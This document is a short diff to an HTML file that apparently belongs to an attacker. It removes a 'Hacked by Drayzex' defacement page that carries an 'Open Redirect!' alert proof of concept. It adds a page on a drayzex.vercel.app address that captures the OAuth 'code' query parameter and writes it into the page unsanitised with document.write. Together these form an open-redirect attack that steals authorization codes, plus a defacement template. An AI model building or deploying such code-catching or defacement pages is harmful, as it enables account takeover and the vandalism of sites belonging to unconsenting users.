@@ -1,49 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Hacked by Drayzex</title>
-  <style>
-    body {
-      margin: 0;
-      background-color: #000;
-      color: #f00;
-      font-family: 'Courier New', Courier, monospace;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-      animation: fadeIn 2s ease-in-out;
-    }
-
-    h1 {
-      font-size: 3em;
-      margin-bottom: 0.5em;
-    }
-
-    p {
-      font-size: 1.5em;
-      color: #ccc;
-    }
-
-    .glow {
-      text-shadow: 0 0 10px #f00, 0 0 20px #f00, 0 0 30px #f00;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-  </style>
+<!-- https://drayzex.vercel.app/oauth.html -->
+<html>
+  <h1>✅ تم الاستقبال</h1>
   <script>
-    alert("Open Redirect!");
+    const url = new URLSearchParams(location.search);
+    document.write("CODE = " + url.get("code"));
   </script>
-</head>
-<body>
-  <h1 class="glow">Hacked by Drayzex</h1>
-  <p>Your security is a joke 😈</p>
-</body>
 </html>
